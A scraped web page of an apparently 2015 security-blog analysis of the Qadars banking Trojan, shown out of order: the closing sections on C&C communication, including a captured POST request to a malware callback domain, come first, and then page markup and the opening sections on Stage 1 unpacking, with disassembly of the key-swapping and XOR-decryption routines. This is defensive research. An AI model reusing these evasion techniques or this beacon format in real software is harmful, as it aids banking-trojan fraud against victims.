014CFDA8  D9 5E 85 2F D6 0B 94 36  79 56 B6 31 73 87 18 F8  +^à/+.ö6yV¦1sç.°
014CFDB8  69 8A FF 03 7F 20 82 20  14 28 51 E5 1A 00 99 76  iè .. é .(Qs..Öv
014CFDC8  C5 58 A7 34 93 BC 54 A6  85 54 DF 79 F6 1A B9 A2  +Xº4ô+TªàT¯y÷.¦ó
014CFDD8  47 46 1A FE 81 49 22 77  02 A2 10 ED EF 2D 41 43  GF.¦.I&quot;w.ó.fn-AC
014CFDE8  25 91 3E 3A F7 DE 9F C2  C8 EB FC 07 75 0F 87 44  %æ&gt;:˜¦ƒ-+dn.u.çD
014CFDF8  01 66 9F 1B 54 7D A0 64  D8 02 6C C1 ED BA 56 DD  .fƒ.T}ád+.l-f¦V¦
014CFE08  BA 5F 63 2A 2C 01 B0 89  D4 19 FF 3F 4F 66 54 5A  ¦_c*,.¦ë+. ?OfTZ
014CFE18  80 94 81 DA 1E 93 61 66  52 B4 B7 B5 45 09 B2 52  Çö.+.ôafR¦+¦E.¦R
014CFE28  D1 37 2A 19 40 C3 77 07  EB B9 C2 B4 23 7D 10 31  -7*.@+w.d¦-¦#}.1
014CFE38  8B A9 2E F1 4E 5E 67 46  09 8B 1C 5B ED F1 07 C8  ï¬.±N^gF.ï.[f±.+
014CFE48  DB 3D 71 3A A8 96 58 F2  95 10 F0 D8 89 33 11 41  ¦=q:¿ûX=ò.=+ë3.A
014CFE58  26 AD BD 99 A5 79 9A 11  DE A5 17 2A 68 86 88 C0  &amp;¡+ÖÑyÜ.¦Ñ.*håê+
014CFE68  03 04 EF 59 5C 7E D4 9F  13 7F D2 90 B5 2A 00 37  ..nY\~+ƒ..-.¦*.7
014CFE78  D6 08 91 CD 76 DD 9B EF  CD B3 61 BF 66 D5 9B C4  +.æ-v¦¢n-¦a+f+¢-
014CFE88  B3 6B 49 41 F7 E8 34 39  64 17 5F CA AC 8B 1A C2  ¦kIA˜F49d._-¼ï.-
014CFE98  81 1F 23 09 15 C7 01 6F  51 61 74 93 79 28 EA B8  ..#..¦.oQatôy(O+
014CFEA8  74 28 D2 7F 09 34 CC C2  01 CE 5B 94 F0 3C EE 22  t(-..4¦-.+[ö=&lt;e&quot;
014CFEB8  A9 3F C9 91 DC 0E CB 98  D0 06 8B 25 A8 CA 73 43  ¬?+æ_.-ÿ-.ï%¿-sC
014CFEC8  E1 86 88 03 AB 34 83 E3  FC 6A EA 01 57 52 EB A8  ßåê.½4âpnjO.WRd¿
014CFED8  52 3C 8A 7D 13 23 6F B0  DA 08 FC 90 31 98 FD E4  R&lt;è}.#o¦+.n.1ÿ²S
014CFEE8  C4 DF 75 CE DC B6 DA DD  B7 23 7C A8 A0 9B AD BA  -¯u+_¦+¦+#|¿á¢¡¦&lt;/pre&gt;
This buffer is then base64-encoded:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;014CFF18  71 67 41 41 41 41 67 41  7A 50 61 33 6D 34 44 41  qgAAAAgAzPa3m4DA
014CFF28  61 6E 61 42 55 73 72 6C  62 4F 6F 63 67 63 6A 64  anaBUsrlbOocgcjd
014CFF38  56 76 31 72 31 4A 6C 78  58 70 32 68 33 37 49 71  Vv1r1JlxXp2h37Iq
014CFF48  4B 41 41 49 41 49 70 34  52 74 69 71 38 4E 47 37  KAAIAIp4Rtiq8NG7
014CFF58  5A 4B 4E 46 54 45 4F 55  78 59 2F 74 6F 51 4F 39  ZKNFTEOUxY/toQO9
014CFF68  47 6F 6F 34 58 52 6E 77  32 67 6A 6E 4A 43 49 41  Goo4XRnw2gjnJCIA
014CFF78  43 41 44 36 69 69 45 4F  68 4E 2F 4F 56 50 31 54  CAD6iiEOhN/OVP1T
014CFF88  64 61 73 39 48 35 6B 6A  51 35 34 35 72 71 4A 56  das9H5kjQ545rqJV
014CFF98  4C 42 55 4A 32 77 37 79  70 46 6B 61 41 41 67 41  LBUJ2w7ypFkaAAgA
014CFFA8  69 43 62 50 35 64 52 78  57 74 5A 30 6D 48 4C 51  iCbP5dRxWtZ0mHLQ
014CFFB8  58 6F 79 6D 38 36 48 50  6E 46 75 6E 58 55 79 77  Xoym86HPnFunXUyw
014CFFC8  2B 72 63 35 77 6E 75 69  4D 41 41 49 41 4B 51 47  +rc5wnuiMAAIAKQG
014CFFD8  32 56 36 46 4C 39 59 4C  6C 44 5A 35 56 72 59 78  2V6FL9YLlDZ5VrYx
014CFFE8  63 34 63 59 2B 47 6D 4B  2F 77 4E 2F 49 49 49 67  c4cY+GmK/wN/IIIg
014CFFF8  46 43 68 52 35 52 6F 41  6D 58 62 46 57 4B 63 30  FChR5RoAmXbFWKc0
014D0008  6B 37 78 55 70 6F 56 55  33 33 6E 32 47 72 6D 69  k7xUpoVU33n2Grmi
014D0018  52 30 59 61 2F 6F 46 4A  49 6E 63 43 6F 68 44 74  R0Ya/oFJIncCohDt
014D0028  37 79 31 42 51 79 57 52  50 6A 72 33 33 70 2F 43  7y1BQyWRPjr33p/C
014D0038  79 4F 76 38 42 33 55 50  68 30 51 42 5A 70 38 62  yOv8B3UPh0QBZp8b
014D0048  56 48 32 67 5A 4E 67 43  62 4D 48 74 75 6C 62 64  VH2gZNgCbMHtulbd
014D0058  75 6C 39 6A 4B 69 77 42  73 49 6E 55 47 66 38 2F  ul9jKiwBsInUGf8/
014D0068  54 32 5A 55 57 6F 43 55  67 64 6F 65 6B 32 46 6D  T2ZUWoCUgdoek2Fm
014D0078  55 72 53 33 74 55 55 4A  73 6C 4C 52 4E 79 6F 5A  UrS3tUUJslLRNyoZ
014D0088  51 4D 4E 33 42 2B 75 35  77 72 51 6A 66 52 41 78  QMN3B+u5wrQjfRAx
014D0098  69 36 6B 75 38 55 35 65  5A 30 59 4A 69 78 78 62  i6ku8U5eZ0YJixxb
014D00A8  37 66 45 48 79 4E 73 39  63 54 71 6F 6C 6C 6A 79  7fEHyNs9cTqolljy
014D00B8  6C 52 44 77 32 49 6B 7A  45 55 45 6D 72 62 32 5A  lRDw2IkzEUEmrb2Z
014D00C8  70 58 6D 61 45 64 36 6C  46 79 70 6F 68 6F 6A 41  pXmaEd6lFypohojA
014D00D8  41 77 54 76 57 56 78 2B  31 4A 38 54 66 39 4B 51  AwTvWVx+1J8Tf9KQ
014D00E8  74 53 6F 41 4E 39 59 49  6B 63 31 32 33 5A 76 76  tSoAN9YIkc123Zvv
014D00F8  7A 62 4E 68 76 32 62 56  6D 38 53 7A 61 30 6C 42  zbNhv2bVm8Sza0lB
014D0108  39 2B 67 30 4F 57 51 58  58 38 71 73 69 78 72 43  9+g0OWQXX8qsixrC
014D0118  67 52 38 6A 43 52 58 48  41 57 39 52 59 58 53 54  gR8jCRXHAW9RYXST
014D0128  65 53 6A 71 75 48 51 6F  30 6E 38 4A 4E 4D 7A 43  eSjquHQo0n8JNMzC
014D0138  41 63 35 62 6C 50 41 38  37 69 4B 70 50 38 6D 52  Ac5blPA87iKpP8mR
014D0148  33 41 37 4C 6D 4E 41 47  69 79 57 6F 79 6E 4E 44  3A7LmNAGiyWoynND
014D0158  34 59 61 49 41 36 73 30  67 2B 50 38 61 75 6F 42  4YaIA6s0g+P8auoB
014D0168  56 31 4C 72 71 46 49 38  69 6E 30 54 49 32 2B 77  V1LrqFI8in0TI2+w
014D0178  32 67 6A 38 6B 44 47 59  2F 65 54 45 33 33 58 4F  2gj8kDGY/eTE33XO
014D0188  33 4C 62 61 33 62 63 6A  66 4B 69 67 6D 77 3D 3D  3Lba3bcjfKigmw==&lt;/pre&gt;
The base64-encoded buffer is checked for the presence of &quot;+&quot; and &quot;=&quot; characters. These characters are replaced with &quot;%2B&quot; and &quot;%3D&quot;, respectively. The malware creates an additional 7-byte-long pseudorandom string:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true &quot;&gt;0012D780  6C 56 46 64 69 59 70 00  00 00 00 00 00 00 00 00  lVFdiYp&lt;/pre&gt;
This string is then prepended to the base64-encoded buffer:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;014D0C28  78 59 2F 74 6F 51 4F 39  47 6F 6F 34 58 52 6E 77  xY/toQO9Goo4XRnw
014D0C38  32 67 6A 6E 4A 43 49 41  43 41 44 36 69 69 45 4F  2gjnJCIACAD6iiEO
014D0C48  68 4E 2F 4F 56 50 31 54  64 61 73 39 48 35 6B 6A  hN/OVP1Tdas9H5kj
014D0C58  51 35 34 35 72 71 4A 56  4C 42 55 4A 32 77 37 79  Q545rqJVLBUJ2w7y
014D0C68  70 46 6B 61 41 41 67 41  69 43 62 50 35 64 52 78  pFkaAAgAiCbP5dRx
014D0C78  57 74 5A 30 6D 48 4C 51  58 6F 79 6D 38 36 48 50  WtZ0mHLQXoym86HP
014D0C88  6E 46 75 6E 58 55 79 77  25 32 42 72 63 35 77 6E  nFunXUyw%2Brc5wn
014D0C98  75 69 4D 41 41 49 41 4B  51 47 32 56 36 46 4C 39  uiMAAIAKQG2V6FL9
014D0CA8  59 4C 6C 44 5A 35 56 72  59 78 63 34 63 59 25 32  YLlDZ5VrYxc4cY%2
014D0CB8  42 47 6D 4B 2F 77 4E 2F  49 49 49 67 46 43 68 52  BGmK/wN/IIIgFChR
014D0CC8  35 52 6F 41 6D 58 62 46  57 4B 63 30 6B 37 78 55  5RoAmXbFWKc0k7xU
014D0CD8  70 6F 56 55 33 33 6E 32  47 72 6D 69 52 30 59 61  poVU33n2GrmiR0Ya
014D0CE8  2F 6F 46 4A 49 6E 63 43  6F 68 44 74 37 79 31 42  /oFJIncCohDt7y1B
014D0CF8  51 79 57 52 50 6A 72 33  33 70 2F 43 79 4F 76 38  QyWRPjr33p/CyOv8
014D0D08  42 33 55 50 68 30 51 42  5A 70 38 62 56 48 32 67  B3UPh0QBZp8bVH2g
014D0D18  5A 4E 67 43 62 4D 48 74  75 6C 62 64 75 6C 39 6A  ZNgCbMHtulbdul9j
014D0D28  4B 69 77 42 73 49 6E 55  47 66 38 2F 54 32 5A 55  KiwBsInUGf8/T2ZU
014D0D38  57 6F 43 55 67 64 6F 65  6B 32 46 6D 55 72 53 33  WoCUgdoek2FmUrS3
014D0D48  74 55 55 4A 73 6C 4C 52  4E 79 6F 5A 51 4D 4E 33  tUUJslLRNyoZQMN3
014D0D58  42 25 32 42 75 35 77 72  51 6A 66 52 41 78 69 36  B%2Bu5wrQjfRAxi6
014D0D68  6B 75 38 55 35 65 5A 30  59 4A 69 78 78 62 37 66  ku8U5eZ0YJixxb7f
014D0D78  45 48 79 4E 73 39 63 54  71 6F 6C 6C 6A 79 6C 52  EHyNs9cTqolljylR
014D0D88  44 77 32 49 6B 7A 45 55  45 6D 72 62 32 5A 70 58  Dw2IkzEUEmrb2ZpX
014D0D98  6D 61 45 64 36 6C 46 79  70 6F 68 6F 6A 41 41 77  maEd6lFypohojAAw
014D0DA8  54 76 57 56 78 25 32 42  31 4A 38 54 66 39 4B 51  TvWVx%2B1J8Tf9KQ
014D0DB8  74 53 6F 41 4E 39 59 49  6B 63 31 32 33 5A 76 76  tSoAN9YIkc123Zvv
014D0DC8  7A 62 4E 68 76 32 62 56  6D 38 53 7A 61 30 6C 42  zbNhv2bVm8Sza0lB
014D0DD8  39 25 32 42 67 30 4F 57  51 58 58 38 71 73 69 78  9%2Bg0OWQXX8qsix
014D0DE8  72 43 67 52 38 6A 43 52  58 48 41 57 39 52 59 58  rCgR8jCRXHAW9RYX
014D0DF8  53 54 65 53 6A 71 75 48  51 6F 30 6E 38 4A 4E 4D  STeSjquHQo0n8JNM
014D0E08  7A 43 41 63 35 62 6C 50  41 38 37 69 4B 70 50 38  zCAc5blPA87iKpP8
014D0E18  6D 52 33 41 37 4C 6D 4E  41 47 69 79 57 6F 79 6E  mR3A7LmNAGiyWoyn
014D0E28  4E 44 34 59 61 49 41 36  73 30 67 25 32 42 50 38  ND4YaIA6s0g%2BP8
014D0E38  61 75 6F 42 56 31 4C 72  71 46 49 38 69 6E 30 54  auoBV1LrqFI8in0T
014D0E48  49 32 25 32 42 77 32 67  6A 38 6B 44 47 59 2F 65  I2%2Bw2gj8kDGY/e
014D0E58  54 45 33 33 58 4F 33 4C  62 61 33 62 63 6A 66 4B  TE33XO3Lba3bcjfK
014D0E68  69 67 6D 77 25 33 44 25  33 44 00 00 00 00 00 00  igmw%3D%3D......&lt;/pre&gt;
This data becomes the content of the request sent to the C&amp;C by the malware. Shown below is the sequence of WinINet APIs used by the malware in order to establish communication with the C&amp;C:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true &quot;&gt;InternetOpenA -&gt; InternetConnectA -&gt; HttpOpenRequestA -&gt; InternetSetOptionA -&gt; 
HttpAddRequestHeadersA -&gt; InternetQueryOptionA -&gt; InternetSetOptionA -&gt; HttpSendRequestA .&lt;/pre&gt;
The malware creates a structure containing all request-related information:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;0012C2F4  02 00 00 00 50 4F 53 54  00 00 00 00 00 00 00 00  ....POST........
0012C304  10 1A 41 00 78 E4 12 00  00 00 00 00 F0 7B 85 00  ..A.xS......={à.
0012C314  96 02 00 00 00 00 00 00  7F 00 00 01 50 00 73 6F  û...........P.so
0012C324  66 74 2E 6B 63 73 73 6F  66 74 2E 62 69 7A 00 00  ft.kcssoft.biz..

+04     request type
+10     user-agent(pointer)  
+14     callback domain(pointer)
+1C     data(pointer)
+20     data size
+28     IP address
+2C     port
+2E     callback domain&lt;/pre&gt;
Sample request:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true &quot;&gt;POST /netreport.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
Host: linksbacksreport.com
Content-Length: 660
Cache-Control: no-cache

ROVivvn=qgAAAAgAnARHff0xZPE00vxRaB9ckHI5PjMe1aS2Esg25vckKQAIAKFrp8coemQ03zIpl
j77vqVlZSznbkKODJhKHmHZ4SsACAARNkkvw57mRSjtycoWwPyy0kftYPDihXzAUSN0V9sFAAgAxy
Dorqby0JdIt8dt3evWx2UzRarDJehmERfgEMusBQAIAKTf4bMa6zL6dkzPu3yq5/J8BUPk0e/ss9c
mZdJpBgMAxGjEiHDNUZ/0/FiYXB4uXxPAeTeNHTDj3LQEmuejOkcBEN4K0zB3ch2uTWPlpFHP5o68
X5BUP/1rFgCO%2BTHJ4hHJXylQY4hmm1LtyGHw5ZYaJxrMtWK%2BcKCeUVs/Hq/dV3E4BkeLklzkT
9S5%2B5oxSF6d4aAxyee7VzwAg9pBZGXZxyJQBDCVuAjyw1QSeial8vI69Q9I9ACgJ9YxWVeFHTF%
2B7CTzyqR3DChYFuNmzsZ8AUR6SpfyZKxRtRQpz3XEb0k7Wqk3WgJHAtzBhq5suMZzHYMQaeDow6Q
JIL52WsEPCig35m5EfIC9Bh1RZkcvnw44p7axtBQ3D2Ue7fKTFknARNvQHvkzXt7QiCUkwLBpUs1z
p3vhbhdyKVBCKP65biyzElXdZEh/D49UnoFG8w%3D%3D
&lt;/pre&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
The first stage was successful in hiding the main malware module from the antivirus engines at the time it first appeared in the wild. But Stage 1 fails to hide the main module at present as antivirus signatures. Encrypted communication creates difficulties for the dynamic analysis since it makes it hard to understand the payload creation. Persistence mechanisms employed by the malware (scheduling a task at the next login) is uncommon.

[cf]skyword_tracking_tag[/cf]"
      }
</script>

<!-- BREADCRUMB SCHEMA -->
<script id="post-schema" type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "BreadcrumbList",
        "itemListElement": [
            {
                "@type": "ListItem",
                "position": 1,
                "name": "Home",
                "item": "https://securityintelligence.com/"
            },
                    ]
    }
</script>
<div id="progressbar">
    <amp-animation id="progress-animation" layout="nodisplay">
        <script type="application/json">
            {
                "duration": "1s",
                "iterations": "1",
                "fill": "both",
                "direction": "alternate",
                "animations": [{
                    "selector": "#progressbar",
                    "keyframes": [{
                        "transform": "translateX(0)"
                    }]
                }]
            }
        </script>
    </amp-animation>
</div>
<amp-position-observer target="post__content" intersection-ratios="0" viewport-margins="25vh 75vh" on="scroll:progress-animation.seekTo(percent=event.percent)" layout="nodisplay"></amp-position-observer>

<div class="dark_background"  style="background:black;"></div>
<div class="container grid" style="background:black;">
      <!-- Breadcrumbs -->
      
<aside class="breadcrumbs ">
      <h1 class="breadcrumbs__page_title">An Analysis of the Qadars Banking Trojan</h1>      </aside>
</div>
<div class="container grid hero_background ">
      <div class="grid__content post ">
            <div class="post__thumbnail">                
                <amp-img alt="" width="1200" height="630" layout="responsive" src="/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan-630x330.png.webp" srcset="/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan.png.webp 300w,
                    /wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan-630x330.png.webp 630w,
                    /wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan.png.webp 1200w,
                    /wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan.png.webp 2400w">
                    <amp-img fallback alt="" width="1200" height="630" layout="responsive" src="https://securityintelligence.com/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan-630x330.png" srcset="https://securityintelligence.com/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan.png 300w,
                            https://securityintelligence.com/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan-630x330.png 630w,
                            https://securityintelligence.com/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan.png 1200w,
                            https://securityintelligence.com/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan.png 2400w">
                    </amp-img>
                </amp-img>
            </div>            <div class="new_categoy">
            <div class="category-container">
            
      <div class="category">
                  <div class="theme">
                        <div class="form-check form-switch">
                        <div class="link-container">
                              <a href="#" class="theme-link" id="light-theme-link">Light</a>
                              <a href="#" class="theme-link" id="dark-theme-link">Dark</a>
                        </div>
                        </div>
                  </div>
                  <hr class="separator">
                  <div class="author_date">
                        <div class="information">
                        <span class="date">July 23, 2015</span>
                        <span class="author_category">By <a href="https://securityintelligence.com/author/igor-aronov/" >Igor Aronov</a>
                                                </span>
                        <span  class="author_category"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 26</span> <span class="rt-label rt-postfix">min read</span></span></span>
                        </div>
                  </div>
                  <hr class="separator">
                  <div class="title">
                  <a href="https://securityintelligence.com/category/x-force/"><span class="name_category">X-Force<br>
                                        
                  </span></a>
                  
                  </div>
                  <div class="social-container" style="visibility: hidden;">
                  <hr class="separator">
                  <div class="social">
                                                                        <!-- Social ICONS -->
                              <a href="https://twitter.com/intent/tweet?text=An Analysis of the Qadars Banking Trojan&url=https://securityintelligence.com/an-analysis-of-the-qadars-trojan/" target="_blank" rel="noopener noreferrer"><amp-img class="arrow" layout="fixed" height="26" width="26" src="https://securityintelligence.com/wp-content/themes/sapphire/images/social-icons/twitter.svg" alt="twitter"></amp-img></a>
                              <a href="https://www.linkedin.com/shareArticle?url=https://securityintelligence.com/an-analysis-of-the-qadars-trojan/" target="_blank" rel="noopener noreferrer"><amp-img class="arrow" layout="fixed" height="26" width="26" src="https://securityintelligence.com/wp-content/themes/sapphire/images/social-icons/linkedin.svg" alt="Linkedin" ></amp-img></a>
                              <a href="https://www.facebook.com/sharer/sharer.php?u=https://securityintelligence.com/an-analysis-of-the-qadars-trojan/" target="_blank" rel="noopener noreferrer"><amp-img class="arrow" layout="fixed" height="26" width="26" src="https://securityintelligence.com/wp-content/themes/sapphire/images/social-icons/facebook.svg" alt="facebook"></amp-img></a>
                              <a href="https://securityintelligence.com/an-analysis-of-the-qadars-trojan/" target="_blank" rel="noopener noreferrer"><amp-img class="arrow" layout="fixed" height="26" width="26" src="https://securityintelligence.com/wp-content/themes/sapphire/images/social-icons/link.svg" alt="An arrow pointing up"></amp-img></a>

                                          </div>
                  </div>
            </div>
      <script>
            window.addEventListener('scroll', function() {
            var category = document.querySelector('.category');
            var scrollPosition = window.scrollY;

            if (scrollPosition >= 0) {
                  category.classList.add('sticky');
            } else {
                  category.classList.remove('sticky');
            }
            });

            // Function to set the light theme
            function setLightTheme(event, toSaveLocalStorage = true) {
                  event.preventDefault();
                  const body = document.body;
                  body.classList.remove('dark-theme');
                  // Save the user's theme preference in localStorage
                  if (toSaveLocalStorage && !location.href.includes("/x-force/")) {
                        setSiTheme('light');
                  }
            }

            // Function to set the dark theme
            function setDarkTheme(event, toSaveLocalStorage = true) {
                  event.preventDefault();
                  const body = document.body;
                  body.classList.add('dark-theme');
                  // Save the user's theme preference in localStorage
                  if (toSaveLocalStorage && !location.href.includes("/x-force/")) {
                        setSiTheme('dark');
                  }
            }

            // Add click event listeners to the theme links
            document.getElementById('light-theme-link').addEventListener('click', (event) => setLightTheme(event));
            document.getElementById('dark-theme-link').addEventListener('click', (event) => setDarkTheme(event));

            // Check localStorage to set the initial theme preference
            const themePreference = localStorage.getItem('si-theme-mode');

            // Function to simulate a click event
            function simulateClick(handler, toSaveLocalStorage) {
                  const event = new Event('click');
                  handler(event, toSaveLocalStorage);
            }

            // Apply the correct theme based on URL and preference
            if (location.href.includes("/x-force/")) {
                  simulateClick(setDarkTheme, false); // Apply the dark theme for all x-force posts
            } else if (themePreference === 'dark') {
                  simulateClick(setDarkTheme, true); // Apply the dark theme based on user preference
            } else if (themePreference === 'light') {
                  simulateClick(setLightTheme, true); // Apply the light theme based on user preference (default)
            } else {
                  simulateClick(setLightTheme, true); // Apply the light theme by default
            }
      </script>
<script>
      const cookies = JSON.parse(localStorage.getItem("truste.eu.cookie.notice_preferences"));
      if (cookies && cookies.value === '2:') {
            document.querySelector('.social-container').style.visibility = 'visible';
      }
</script>            </div>
            <main class="post__content   " id="post__content">
                  


<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<html><body><p>I recently noticed a <a href="http://www.kernelmode.info/forum/viewtopic.php?f=16&amp;t=3096" target="_blank" rel="noopener nofollow"  target="_blank" rel="noopener nofollow" >forum thread</a> discussing the Qadars banking Trojan, and at the time, it had a very low detection rate (4/56) on the VT (virustotal.com) SHA1 : 563379a48d876f6c35317bb7551efeb55754123056109ab030d1e796ae1b9c2c.</p>
<p>I decided it would be a decent candidate for a deeper technical look, and I divided my analysis into three&nbsp;logical parts:</p>
<ul>
<li>Stage 1:&nbsp;Obfuscates malicious program flow; protects and decrypts main module.</li>
<li>Stage 2:&nbsp;Gathers per-system unique information, establishes persistence on the system and runs new process (Stage 3).</li>
<li>Stage 3: Establishes communication with the command-and-control (C&amp;C) center.</li>
</ul>
<h2><strong>Stage 1</strong></h2>
<p>This stage consist of two distinct parts. Both are used to protect the main malware module from detection. The malware performs the following steps to achieve this:</p>
<ul>
<li>Obfuscates malware&rsquo;s flow by creating &ldquo;garbage&rdquo; code;</li>
<li>Changes the control flow of a program by creating a structured exception handling (SEH) exception and passing control to it;</li>
<li>Decrypts a blob of data that becomes new code section and jumps to it from an exception;</li>
<li>Performs an &ldquo;egg hunt&rdquo; to find an additional blob of data. This data is then decrypted and decompressed and becomes a new Portable Executable (PE) image. This is the main malware module.</li>
</ul>
<p>Additional details about the first part&nbsp;of Stage 1 (exception handler):</p>
<ul>
<li>Resolves address of kernel32.</li>
<li>Resolves address of HeapCreate and allocates buffer of size 0x2729.
<ul>
<li>Stack before the call to HeapCreate:</li>
</ul>
</li>
</ul>
<pre class="height:100 width-set:true width:100 width-unit:1 lang:default decode:true ">        012F7A0  00040000   ;HEAP_CREATE_ENABLE_EXECUTE
        012F7A4  00002729   ;initial size
        012F7A8  00002729   ;max size</pre>
<ul>
<li>Takes the blob of data at offset 0040C9E8 in the original file, then copies and arranges it.</li>
</ul>
<p>This blob of data is treated as an array. The array after transformation becomes the new code section and control is passed to it. The steps taken by the malware to transform array into the valid code are simple bit swaps based on the key generated offset calculations. The algorithm is shown below:</p>
<ol>
<li>The blob of data is copied to a buffer allocated on the heap. The buffer is treated as an array.</li>
<li>Calculates an offset for the first character to be swapped:</li>
</ol>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true">    ;Initial key is 0x5A219DBA.
    ;.text:0041F858 8B 45 14                mov     eax, [ebp+key]
    ;.text:0041F85B 33 D2                   xor     edx, edx
    ;.text:0041F85D F7 75 10                div     [ebp+data_size]
    ;.text:0041F860 89 55 E8                mov     [ebp+reminder], edx</pre>
<ol start="3">
<li>Stores the result locally:</li>
</ol>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true">    ;.text:0041FAC5 8B 4D 08                mov     ecx, [ebp+allocated_buffer]
    ;.text:0041FAC8 03 4D E8                add     ecx, [ebp+reminder]
    ;.text:0041FACB 8A 11                   mov     dl, [ecx]
    ;.text:0041FACD 88 55 E4                mov     [ebp+current_char_3], dl</pre>
<ol start="4">
<li>Calculates an offset for the second character to be swapped and stores it locally. This character is taken from the end of an array minus number of characters already processed:</li>
</ol>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true">    ;.text:0041FC18 8B 55 08                mov     edx, [ebp+allocated_buffer]
    ;.text:0041FC1B 03 55 FC                add     edx, [ebp+counter]
    ;.text:0041FC1E 8A 42 FF                mov     al, [edx-1]
    ;.text:0041FC21 88 45 EC                mov     [ebp+current_char_1], a</pre>
<ol start="5">
<li>Swaps the first and second characters:</li>
</ol>
<pre class="height-set:true height:150 width:100 width-unit:1 lang:default decode:true">    ;.text:0041FD4D 8B 45 08                mov     eax, [ebp+allocated_buffer]
    ;.text:0041FD50 03 45 E8                add     eax, [ebp+reminder]
    ;.text:0041FD53 8A 4D EC                mov     cl, [ebp+current_char_1]
    ;.text:0041FD56 88 08                   mov     [eax], cl

    ;.text:0041FFCE 8B 45 08                mov     eax, [ebp+allocated_buffer]
    ;.text:0041FFD1 03 45 FC                add     eax, [ebp+counter]
    ;.text:0041FFD4 8A 4D E4                mov     cl, [ebp+current_char_3]
    ;.text:0041FFD7 88 48 FF                mov     [eax-1], cl</pre>
<p>For example, the first two characters to be swapped. Memory before swap:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true  ">00BD0614  00 
00BD2728  A6</pre>
<p>Memory after swap:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true">00BD0614  A6 
00BD2728  00</pre>
<ol start="6">
<li>Calculates the key used in the calculations for the next first character to be swapped:</li>
</ol>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">    ;.text:004201CD 8B 55 14                mov     edx, [ebp+key]
    ;.text:004201D0 C1 EA 19                shr     edx, 19h
    ;.text:004201D3 89 55 F0                mov     [ebp+new_key], edx
    ;.text:004203B1 8B 4D 14                mov     ecx, [ebp+key]
    ;.text:004203B4 C1 E1 07                shl     ecx, 7
    ;.text:004203B7 89 4D 14                mov     [ebp+key], ecx
    ;.text:00420680 8B 55 14                mov     edx, [ebp+key]
    ;.text:00420683 0B 55 F0                or      edx, [ebp+new_key]
    ;.text:00420686 89 55 14                mov     [ebp+key], edx
    ;.text:004207FB 8B 55 14                mov     edx, [ebp+key]
    ;.text:004207FE 2B 55 10                sub     edx, [ebp+data_size]
    ;.text:00420801 89 55 14                mov     [ebp+key], edx
    ;.text:00420AD5 8B 45 14                mov     eax, [ebp+key]
    ;.text:00420AD8 2D D2 02 96 49          sub     eax, 499602D2h
    ;.text:00420ADD 89 45 14                mov     [ebp+key], eax</pre>
<p>Jumps to the newly created code section:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true">.text:00406447 FF 55 FC                call    [ebp+allocated_buffer]</pre>
<p>Additional details about part two of Stage 1 (in the newly created code section):</p>
<ul>
<li>Resolves API addresses at runtime and immediately calls those APIs; no Import Table is created.</li>
<li>Locates an XOR-encrypted blob of data.</li>
<li>Decrypts the blob of data and decompresses it.</li>
<li>The decrypted and decompressed blob is the main malware module.</li>
</ul>
<p>To find a blob of data, the malware uses a technique similar to the &ldquo;egg hunt&rdquo; technique used in the shellcode. First, it calculated the following data:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true">0012F74C  56 6F FC 5A 83 1A 34 D9  6F 5C 41 73 28 94 EF 13  VonZ&acirc;.4+o\As(&ouml;n.
0012F75C  31 A8 B9 0B 									    
1&iquest;&brvbar;
</pre>
<p>The content of the main malware module is copied into a buffer allocated on the heap. The first 8 bytes are the marker that the malware is searching for in the executable. This is the so-called &ldquo;egg,&rdquo; and it is found at offset 0xE511 in the executable on the disk. The scanning is performed from the end to the beginning of the file. Once the marker is found, the malware calculates the size of the encrypted blob of data. In order to do this, it takes 4 bytes immediately following the &ldquo;egg&rdquo; and XORs it with the data at offset +0x08 in the blob of data shown above.</p>
<p>Next, 8 bytes in the file and in the blob of data above (offset +0x0C) are used to calculate the initial XOR&nbsp;key that is used to decrypt the blob of data. The encrypted data in the file starts at offset 0xE525; the size of the blob of data is 0xC76A. The following function is used to decrypt the blob of data:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">debug025:00BD0CBE                         decode_data_to_decompress proc near     
debug025:00BD0CBE
debug025:00BD0CBE                         var_18= dword ptr -18h
debug025:00BD0CBE                         var_14= dword ptr -14h
debug025:00BD0CBE                         var_10= dword ptr -10h
debug025:00BD0CBE                         var_C= dword ptr -0Ch
